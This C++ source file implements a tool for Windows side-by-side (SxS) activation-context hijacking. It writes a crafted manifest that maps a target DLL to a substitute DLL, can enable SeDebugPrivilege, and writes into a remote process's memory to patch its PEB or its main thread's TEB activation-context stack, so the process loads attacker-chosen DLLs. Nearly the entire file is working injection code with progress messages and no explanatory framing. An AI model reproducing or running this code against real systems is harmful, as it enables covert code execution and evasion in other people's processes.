#include "activation-context.h"

std::vector<BYTE> byte_activation_context
{
  0x3c, 0x3f, 0x78, 0x6d, 0x6c, 0x20, 0x76, 0x65,
  0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x27, 0x31,
  0x2e, 0x30, 0x27, 0x20, 0x65, 0x6e, 0x63, 0x6f,
  0x64, 0x69, 0x6e, 0x67, 0x3d, 0x27, 0x55, 0x54,
  0x46, 0x2d, 0x38, 0x27, 0x20, 0x73, 0x74, 0x61,
  0x6e, 0x64, 0x61, 0x6c, 0x6f, 0x6e, 0x65, 0x3d,
  0x27, 0x79, 0x65, 0x73, 0x27, 0x3f, 0x3e, 0x0d,
  0x0d, 0x0a, 0x3c, 0x61, 0x73, 0x73, 0x65, 0x6d,
  0x62, 0x6c, 0x79, 0x20, 0x78, 0x6d, 0x6c, 0x6e,
  0x73, 0x3d, 0x27, 0x75, 0x72, 0x6e, 0x3a, 0x73,
  0x63, 0x68, 0x65, 0x6d, 0x61, 0x73, 0x2d, 0x6d,
  0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74,
  0x2d, 0x63, 0x6f, 0x6d, 0x3a, 0x61, 0x73, 0x6d,
  0x2e, 0x76, 0x31, 0x27, 0x20, 0x6d, 0x61, 0x6e,
  0x69, 0x66, 0x65, 0x73, 0x74, 0x56, 0x65, 0x72,
  0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x27, 0x31, 0x2e,
  0x30, 0x27, 0x3e, 0x0d, 0x0d, 0x0a, 0x20, 0x20,
  0x3c, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6e,
  0x66, 0x6f, 0x20, 0x78, 0x6d, 0x6c, 0x6e, 0x73,
  0x3d, 0x22, 0x75, 0x72, 0x6e, 0x3a, 0x73, 0x63,
  0x68, 0x65, 0x6d, 0x61, 0x73, 0x2d, 0x6d, 0x69,
  0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2d,
  0x63, 0x6f, 0x6d, 0x3a, 0x61, 0x73, 0x6d, 0x2e,
  0x76, 0x33, 0x22, 0x3e, 0x0d, 0x0d, 0x0a, 0x20,
  0x20, 0x20, 0x20, 0x3c, 0x73, 0x65, 0x63, 0x75,
  0x72, 0x69, 0x74, 0x79, 0x3e, 0x0d, 0x0d, 0x0a,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x72,
  0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64,
  0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67,
  0x65, 0x73, 0x3e, 0x0d, 0x0d, 0x0a, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x72,
  0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64,
  0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f,
  0x6e, 0x4c, 0x65, 0x76, 0x65, 0x6c, 0x20, 0x6c,
  0x65, 0x76, 0x65, 0x6c, 0x3d, 0x27, 0x61, 0x73,
  0x49, 0x6e, 0x76, 0x6f, 0x6b, 0x65, 0x72, 0x27,
  0x20, 0x75, 0x69, 0x41, 0x63, 0x63, 0x65, 0x73,
  0x73, 0x3d, 0x27, 0x66, 0x61, 0x6c, 0x73, 0x65,
  0x27, 0x20, 0x2f, 0x3e, 0x0d, 0x0d, 0x0a, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x2f, 0x72,
  0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64,
  0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67,
  0x65, 0x73, 0x3e, 0x0d, 0x0d, 0x0a, 0x20, 0x20,
  0x20, 0x20, 0x3c, 0x2f, 0x73, 0x65, 0x63, 0x75,
  0x72, 0x69, 0x74, 0x79, 0x3e, 0x0d, 0x0d, 0x0a,
  0x20, 0x20, 0x3c, 0x2f, 0x74, 0x72, 0x75, 0x73,
  0x74, 0x49, 0x6e, 0x66, 0x6f, 0x3e, 0x0d, 0x0d,
  0x0a, 0x20, 0x3c, 0x2f, 0x61, 0x73, 0x73, 0x65,
  0x6d, 0x62, 0x6c, 0x79, 0x3e, 0x0d, 0x0d, 0x0a
};
HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");

void hijack_process(HANDLE process_handle, HANDLE thread_handle, LPBYTE ac_struct_ptr, DWORD dwSize, BOOL resume_thread)
{
	PROCESS_BASIC_INFORMATION process_information{};
	NTSTATUS status = NtQueryInformationProcess(process_handle, (PROCESSINFOCLASS)0, &process_information, sizeof(PROCESS_BASIC_INFORMATION), NULL);

	if (!NT_SUCCESS(status))
	{
		std::wcout << L"[x] Failed to obtain the remote process' PEB base address " + std::to_wstring(status) + L"\n";
		return;
	}

	std::wcout <<L"[+] Remote process PEB base address obtained.\n";

	PVOID base_address = NULL;
	uintptr_t zero_bits = 0;
	uintptr_t size = dwSize;
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = _NtAllocateVirtualMemory(GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));

	status = NtAllocateVirtualMemory(process_handle, &base_address, zero_bits, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != 0)
	{
		std::wcout <<L"[x] Failed to allocate memory in the remote process " + std::to_wstring(status) + L"\n";
		return;
	}
	std::wcout <<L"[+] Memory successfully allocated.\n";

	SIZE_T bytes_written = 0;
	NtWriteVirtualMemory_t NtWriteVirtualMemory = NtWriteVirtualMemory_t(GetProcAddress(hNtdll, "NtWriteVirtualMemory"));
	status = NtWriteVirtualMemory(process_handle, base_address, ac_struct_ptr, dwSize, &bytes_written);

	if (status != 0)
	{
		std::wcout <<L"[x] Failed to write the Activation Context data struct to the remote process " + std::to_wstring(status) + L"\n";
		return;
	}
	std::wcout << L"[+] Activation Context mapped in the remote process.\n";

	uintptr_t field_offset = (uintptr_t)process_information.PebBaseAddress + 0x2f8;
	uintptr_t value = (uintptr_t) &base_address;
	status = NtWriteVirtualMemory(process_handle, (PVOID)field_offset,&base_address, 8, &bytes_written);

	if (status != 0)
	{
		std::wcout <<L"[x] Failed to patch the remote process PEB " + std::to_wstring(status) + L"\n";
		return;
	}

	std::wcout <<L"[+] PEB successfully patched.\n";
	if (resume_thread)
	{
		std::wcout <<L"[-] Resuming process...\n";
		ResumeThread(thread_handle);
	}
}

void sxs_hijack(DWORD pid, std::wstring target_dll, std::wstring dummy_dll, bool enable_debug)
{
	
	wchar_t temp_path[MAX_PATH];
	std::wstring manifest_path;

	// Get temp file path
	DWORD path_len = GetTempPath(MAX_PATH, temp_path);
	if (path_len == 0 || path_len > MAX_PATH)
	{
		std::wcout <<L"[-] Failed to get temp path\n";
		return;
	}
	manifest_path.assign(temp_path, temp_path+path_len);
	manifest_path +=  std::to_wstring(pid) + L".manifest";

	std::vector<BYTE> data = extract_manifest(get_process_path(pid));
	if (data.empty())
	{
		// if program have no manifest file
		data = byte_activation_context;
	}
	std::vector<BYTE> manifest = add_hijack_actctx(dummy_dll, target_dll, data);
	save_data_to_file(manifest, manifest_path);

	uintptr_t ret{};
	NTSTATUS status{};

	if (enable_debug)
	{
		uintptr_t privilege = 20;
		uint8_t enable = 1;
		uint8_t pre_enabled;
		RtlAdjustPrivilege_t	RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		ret = RtlAdjustPrivilege(privilege, enable, 0, &pre_enabled);
		if (ret != 0)
		{
			std::wcout <<L"[x] SeDebugPrivilege could not be enabled" + std::to_wstring(ret) + L"\n";
			return;
		}
		std::wcout <<L"[+] SeDebugPrivilege enabled.\n";
	}

	ACTCTXW context{ 0 };
	HMODULE hmodule = NULL;
	context.cbSize = sizeof(ACTCTXW);


	DWORD attributes = GetFileAttributesW(manifest_path.c_str());
	if (attributes != INVALID_FILE_ATTRIBUTES && !(attributes & FILE_ATTRIBUTE_DIRECTORY))
	{
		std::wcout <<L"[+] Manifest file path exist.\n";
	}
	else
	{
		std::wcout <<L"[-] Manifest file path does not exist.\n";
		return;
	}

	context.dwFlags = 0; 
	context.lpSource = manifest_path.c_str(); 


	HANDLE context_handle = CreateActCtxW(&context);
	if (context_handle == INVALID_HANDLE_VALUE)
	{
		std::wcout <<L"[x] Failed to create Activation Context " + std::to_wstring(GetLastError()) + L"\n";
		return;
	}

	std::wcout << L"[+] Local Activation Context created.\n";

	uintptr_t* ac_struct_ptr = (uintptr_t*)context_handle;
	ac_struct_ptr += 3;

	MEMORY_BASIC_INFORMATION mbi{ 0 };
	ret = VirtualQuery((uintptr_t*)*ac_struct_ptr, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

	if (ret == 0)
	{
		std::wcout <<L"[x] Call to VirtualQuery failed " + std::to_wstring(GetLastError()) + L"\n";
		return;
	}

	uintptr_t dwSize = mbi.RegionSize;
	SIZE_T final_size = align_to_mempage(dwSize + 1);
	BYTE* dst_buffer = NULL;
	BYTE* src_buffer = reinterpret_cast<BYTE*>(*ac_struct_ptr);
	LPVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, final_size);
	dst_buffer = (BYTE*)buffer;
	memcpy(dst_buffer, src_buffer, mbi.RegionSize);


	std::wcout <<L"[-] Looking for the remote process main thread...\n";

	DWORD tid = get_main_thread_id(pid);
	if (tid == 0)
	{
		std::wcout <<L"[x] Main thread not found. Fallback to process main Activation Context hijack.\n";

		HANDLE handle_ptr = NULL;
		OBJECT_ATTRIBUTES object_attributes_thread;
		CLIENT_ID client_id;
		client_id.UniqueProcess = (HANDLE)((ULONG_PTR)pid);
		client_id.UniqueThread = NULL;

		uintptr_t desired_acces = PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
		pNtOpenProcess NtOpenProcess = (pNtOpenProcess)(GetProcAddress(hNtdll, "NtOpenProcess"));
		status = NtOpenProcess(&handle_ptr, desired_acces, &object_attributes_thread, &client_id);
		if (status != 0)
		{
			std::wcout <<L"[x] Failed to open a handle to the remote process " + std::to_wstring(status) + L"\n";
			return;
		}
		hijack_process(handle_ptr, NULL, dst_buffer, dwSize, false);
		return;
	}

	std::wcout <<L"[+] Main thread detected. TID: " + std::to_wstring( tid) + L"\n";

	HANDLE thread_handle;
	OBJECT_ATTRIBUTES object_attributes_thread{};
	CLIENT_ID client_id{};
	client_id.UniqueProcess = NULL;
	client_id.UniqueThread = (HANDLE)(tid);
	InitializeObjectAttributes(&object_attributes_thread, NULL, 0, NULL, NULL);
	uint8_t desired_access = THREAD_QUERY_INFORMATION;
	pNtOpenThread NtOpenThread = (pNtOpenThread)(GetProcAddress(hNtdll, "NtOpenThread"));
	ret = NtOpenThread(&thread_handle, desired_access, &object_attributes_thread, &client_id);

	if (ret != 0)
	{
		std::wcout <<L"[x] Failed to open a handle to the remote process' main thread "  + std::to_wstring( ret) + L"\n";
		return;
	}
	std::wcout <<L"\t[-] Handle to main thread opened.\n";

	THREAD_BASIC_INFORMATION thread_information{ 0 };
	ULONG return_length = 0;

	status = NtQueryInformationThread(thread_handle, (THREADINFOCLASS)0, &thread_information, sizeof(THREAD_BASIC_INFORMATION), &return_length);

	if (status != 0)
	{
		std::wcout <<L"[x] Failed to obtain remote process main thread TEB base address " + std::to_wstring( status)+ L"\n";
		return;
	}

	pNtOpenProcess NtOpenProcess = (pNtOpenProcess)(GetProcAddress(hNtdll, "NtOpenProcess"));
	HANDLE process_handle = NULL;
	CLIENT_ID  client_id_process{};
	OBJECT_ATTRIBUTES object_attributes_process{};
	InitializeObjectAttributes(&object_attributes_process, NULL, 0, NULL, NULL);
	client_id_process.UniqueProcess = (HANDLE)(pid);
	client_id_process.UniqueThread = NULL;
	desired_access = PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;

	status = NtOpenProcess(&process_handle, desired_access, &object_attributes_process, &client_id_process);

	if (status != 0)
	{
		std::wcout <<L"[x] Failed to open a handle to the remote process " + std::to_wstring(status) + L"\n";
		return;
	}

	TEB_INTERNAL teb{};
	ULONG bytes_written;
	pNtReadVirtualMemory NtReadVirtualMemory = pNtReadVirtualMemory(GetProcAddress(hNtdll, "NtReadVirtualMemory"));

	ret = NtReadVirtualMemory(process_handle, thread_information.TebBaseAddress, &teb, sizeof(TEB_INTERNAL), 0);

	if (ret != 0)
	{
		std::wcout << L"[x] TEB of the remote process could not be retrieved: "  + std::to_wstring(ret) + L"\n";
		return;
	}

	if (teb.ActivationStack.ActiveFrame == NULL)
	{
		std::wcout <<L"[!] Main thread does not have a custom AC enabled.Hijacking main AC of the process.\n";
		hijack_process(process_handle, NULL, dst_buffer, dwSize, false);
		return;
	}

	std::wcout <<L"[!] Main thread has a custom AC enabled. Hijacking thread's AC stack.\n";

	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)(GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));
	PVOID base_address = NULL;
	uintptr_t zero_bits = 0;
	SIZE_T size = final_size;
	ret = NtAllocateVirtualMemory(process_handle, &base_address, zero_bits, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (ret != 0)
	{
		std::wcout <<L"[x] Failed to allocate memory in the remote process " + std::to_wstring( ret) + L"\n";

		return;
	}
	std::wcout <<L"[+] Memory successfully allocated.\n";

	uintptr_t total_offset = final_size - (sizeof(FrameListWrapper) + 528);
	// PATCH TEB
	FrameListWrapper frame_list_wrapper{};
	uintptr_t flink_blink = (uintptr_t)thread_information.TebBaseAddress + 0x298;
	frame_list_wrapper.blink = (void*)flink_blink;
	frame_list_wrapper.flink = (void*)flink_blink;
	frame_list_wrapper.list_elements[0].activation_context_frame.activation_context = (void*)((uintptr_t)base_address + total_offset + sizeof(FrameListWrapper) + 8);
	frame_list_wrapper.list_elements[0].activation_context_frame.flags = 0x28;

	uint64_t cookie =
		static_cast<uint64_t>(teb.ActivationStack.NextCookieSequenceNumber)
		| ((static_cast<uint64_t>(teb.ActivationStack.StackId) & 0x0FFFFFFF) << 32)
		| 0x1000000000000000;

	frame_list_wrapper.list_elements[0].cookie = cookie;

	dst_buffer += total_offset;
	FrameListWrapper* ptr_offset = reinterpret_cast<FrameListWrapper*>(dst_buffer);
	*ptr_offset = frame_list_wrapper;

	ptr_offset += 1;
	uint8_t* handle_dst_ptr_start = reinterpret_cast<uint8_t*>(ptr_offset);

	uint8_t* src = reinterpret_cast<uint8_t*>(reinterpret_cast<uintptr_t>(context_handle) - 8);

	std::memcpy(handle_dst_ptr_start, src, 528);

	uintptr_t* handle_dst_ptr = reinterpret_cast<uintptr_t*>(handle_dst_ptr_start);
	handle_dst_ptr += 4;

	*handle_dst_ptr = reinterpret_cast<uintptr_t>(base_address);

	handle_dst_ptr_start += 128;
	uintptr_t* unknown_ptr = reinterpret_cast<uintptr_t*>(handle_dst_ptr_start);
	*unknown_ptr = (uintptr_t)(base_address)+total_offset + sizeof(FrameListWrapper) + 136;
	SIZE_T cbBytes = 0;
	NtWriteVirtualMemory_t NtWriteVirtualMemory = NtWriteVirtualMemory_t(GetProcAddress(hNtdll, "NtWriteVirtualMemory"));
	dst_buffer -= total_offset;
	ret = NtWriteVirtualMemory(process_handle, base_address, dst_buffer, final_size, &cbBytes);
	if (ret != 0)
	{

		std::wcout <<L"[x] Failed to write AC data in the new process " + std::to_wstring(ret) + L"\n";
		return;
	}
	std::wcout <<L"[+] AC data successfully written in the remote process.\n";
	ACTIVATION_CONTEXT_STACK act_stack{};
	act_stack = teb.ActivationStack;

	act_stack.NextCookieSequenceNumber += 1;
	act_stack.ActiveFrame = (PRTL_ACTIVATION_CONTEXT_STACK_FRAME)((uintptr_t)base_address + total_offset + 32);
	act_stack.FrameListCache.Blink = (LIST_ENTRY*)(((uintptr_t)base_address + total_offset + 8));
	act_stack.FrameListCache.Flink = (LIST_ENTRY*)(((uintptr_t)base_address + total_offset + 8));

	uintptr_t activation_context_stack_addr = (uintptr_t)thread_information.TebBaseAddress + 0x0290;
	ret = NtWriteVirtualMemory(process_handle, (PVOID)activation_context_stack_addr, &act_stack, sizeof(act_stack), &cbBytes);

	if (ret != 0)
	{
		std::wcout <<L"[x] Failed to patch TEB->ACTIVATION_CONTEXT_STACK field " + std::to_wstring(GetLastError()) + L"\n";
		return;
	}
	std::wcout << L"[+] TEB->ACTIVATION_CONTEXT_STACK patched. Process completed.\n";
	CloseHandle(context_handle);
	HeapFree(GetProcessHeap(), 0, buffer);
}
